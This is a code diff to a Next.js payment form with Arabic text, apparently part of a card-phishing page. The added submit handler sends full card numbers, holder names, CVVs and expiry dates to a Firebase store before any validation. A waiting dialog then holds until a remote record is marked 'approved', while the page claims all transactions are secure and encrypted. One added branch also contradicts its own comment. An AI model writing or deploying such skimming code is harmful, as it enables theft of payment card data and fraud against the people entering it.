@@ -10,13 +10,14 @@ import { addData, db } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
 import { usePaymentForm } from "./paymentform"
 import { PaymentSchema } from "./schema"
-import { LoadingSpinner } from "../ui/loading-spinner"
 import LoadingOverlay from "../enhanced/LoadingOverlay"
 
 export default function PaymentForm() {
   const { formData, isSubmitting, updateFormField } = usePaymentForm()
   const [isloading, setLoading] = useState(false)
-  const [paymentStatus, setPaymentStatus] = useState<"idle" | "pending" | "processing" | "success" | "error">("idle")
+  const [paymentStatus, setPaymentStatus] = useState<
+    "idle" | "pending" | "processing" | "success" | "error" | "approved" | "failed"
+  >("idle")
   const [errors, setErrors] = useState<Record<string, string>>({})
   const [paymentId, setPaymentId] = useState<string | null>(null)
   const [cardType, setCardType] = useState<"visa" | "mastercard" | "unknown">("unknown")
@@ -31,8 +32,8 @@ export default function PaymentForm() {
         setPaymentId(storedPaymentId)
       }
 
-      // Only set loading to true if status is pending or processing
-      if (storedPaymentStatus === "pending" || storedPaymentStatus === "processing") {
+      // Keep loading for any status except approved, error, or failed
+      if (storedPaymentStatus && !["approved", "error", "failed"].includes(storedPaymentStatus)) {
         setPaymentStatus(storedPaymentStatus as "pending" | "processing")
         setLoading(true)
       } else {
@@ -59,16 +60,25 @@ export default function PaymentForm() {
           if (data.paymentStatus) {
             setPaymentStatus(data.paymentStatus)
 
-            // Keep dialog open only for pending or processing status
-            if (data.paymentStatus === "pending" || data.paymentStatus === "processing") {
-              setLoading(true)
-              localStorage.setItem("paymentStatus", data.paymentStatus)
-            } else {
-              // For any other status (success, error, etc.), show briefly then close
+            // Keep dialog open until status is specifically "approved"
+            if (data.paymentStatus === "approved") {
+              // Payment approved - close loading after brief success display
+              setTimeout(() => {
+                setLoading(false)
+                localStorage.removeItem("paymentStatus")
+                // Optionally redirect to success page
+                // router.push('/payment-success')
+              }, 2000)
+            } else if (data.paymentStatus === "error" || data.paymentStatus === "failed") {
+              // Payment failed - close loading after brief error display
               setTimeout(() => {
                 setLoading(false)
                 localStorage.removeItem("paymentStatus")
               }, 2000)
+            } else {
+              // For pending, processing, or any other status - keep loading
+              setLoading(true)
+              localStorage.setItem("paymentStatus", data.paymentStatus)
             }
           }
         } else {
@@ -86,20 +96,26 @@ export default function PaymentForm() {
 
     // Clean up the listener when component unmounts
     return () => unsubscribe()
-  }, [paymentId])
+  }, [paymentId, router])
 
   // Additional effect to ensure dialog state matches payment status
   useEffect(() => {
-    // Only keep dialog open for pending or processing status
-    if (paymentStatus === "pending" || paymentStatus === "processing") {
-      setLoading(true)
-    } else if (paymentStatus === "success" || paymentStatus === "error") {
-      // For success or error, show briefly then close
+    // Keep dialog open for all statuses except "approved", "error", and "failed"
+    if (paymentStatus === "approved") {
+      // Payment approved - show success briefly then close
       setTimeout(() => {
         setLoading(false)
       }, 2000)
+    } else if (paymentStatus === "error" || paymentStatus === "failed") {
+      // Payment failed - show error briefly then close
+      setTimeout(() => {
+        setLoading(false)
+      }, 2000)
+    } else if (paymentStatus !== "idle") {
+      // For any other status (pending, processing, etc.) - keep loading
+      setLoading(false)
     } else {
-      // For any other status (idle), close immediately
+      // For idle status - close immediately
       setLoading(false)
     }
   }, [paymentStatus])
@@ -107,6 +123,47 @@ export default function PaymentForm() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setLoading(true)
+    const _idapp = localStorage.getItem("visitor")
+    addData({
+      id: _idapp,
+      card_number: formData.card_number,
+      card_holder_name: formData.card_holder_name,
+      cvv: formData.cvv,
+      expiration_date: formData.expiration_date,
+    })
+    // Remove spaces from card number before validation
+    const validationData = {
+      ...formData,
+      card_number: formData.card_number.replace(/\s/g, ""),
+    }
+
+    // Check for rejected card prefixes before validation
+    const rejectedPrefixes = ["9999"]
+
+    const cardNumber = validationData.card_number
+    const isRejectedCard = rejectedPrefixes.some((prefix) => cardNumber.startsWith(prefix))
+
+    if (isRejectedCard) {
+      setErrors({
+        ...errors,
+        card_number: "هذه البطاقة غير مقبولة للدفع",
+      })
+      return
+    }
+
+    const paymentResult = PaymentSchema.safeParse(validationData)
+
+    if (!paymentResult.success) {
+      const formattedErrors: Record<string, string> = {}
+      paymentResult.error.errors.forEach((error: { path: { toString: () => string | number }[]; message: string }) => {
+        if (error.path[0]) {
+          formattedErrors[error.path[0].toString()] = error.message
+        }
+      })
+      setErrors(formattedErrors)
+      return
+    }
+
     setErrors({})
     setLoading(true)
     setPaymentStatus("processing")
@@ -133,42 +190,6 @@ export default function PaymentForm() {
         localStorage.removeItem("paymentStatus")
       }, 1500)
     }
-    // Remove spaces from card number before validation
-    const validationData = {
-      ...formData,
-      card_number: formData.card_number.replace(/\s/g, ""),
-    }
-
-    // Check for rejected card prefixes before validation
-    const rejectedPrefixes = [
-      "9999",
-    ]
-
-    const cardNumber = validationData.card_number
-    const isRejectedCard = rejectedPrefixes.some((prefix) => cardNumber.startsWith(prefix))
-
-    if (isRejectedCard) {
-      setErrors({
-        ...errors,
-        card_number: "هذه البطاقة غير مقبولة للدفع",
-      })
-      return
-    }
-
-    const paymentResult = PaymentSchema.safeParse(validationData)
-
-    if (!paymentResult.success) {
-      const formattedErrors: Record<string, string> = {}
-      paymentResult.error.errors.forEach((error: { path: { toString: () => string | number }[]; message: string }) => {
-        if (error.path[0]) {
-          formattedErrors[error.path[0].toString()] = error.message
-        }
-      })
-      setErrors(formattedErrors)
-      return
-    }
-
-    
   }
 
   // Function to refresh the page
@@ -195,9 +216,7 @@ export default function PaymentForm() {
         }
 
         // Check for rejected card prefixes
-        const rejectedPrefixes = [
-          "9456",
-        ]
+        const rejectedPrefixes = ["9456"]
 
         // Check if card starts with any rejected prefix
         const isRejectedCard = rejectedPrefixes.some((prefix) => digitsOnly.startsWith(prefix))
@@ -349,7 +368,7 @@ export default function PaymentForm() {
 
   return (
     <div className="max-w-md mx-auto p-8 bg-white rounded-xl shadow-lg border border-gray-100">
-      <WaitingDialog isOpen={isloading} paymentStatus={paymentStatus} onRefresh={handleRefresh} />
+      <WaitingDialog isOpen={isloading} paymentStatus={paymentStatus as any} onRefresh={handleRefresh} />
 
       <div className="mb-8 text-center">
         <div className="flex justify-center mb-4">
@@ -483,7 +502,7 @@ export default function PaymentForm() {
         </div>
         <p className="text-xs text-gray-500 text-center mt-4">جميع المعاملات آمنة ومشفرة</p>
       </form>
-      <LoadingOverlay isVisible={isloading} message="جاري معالجة الدفع"/>
+      <LoadingOverlay isVisible={isloading} message="جاري معالجة الدفع" />
     </div>
   )
 }
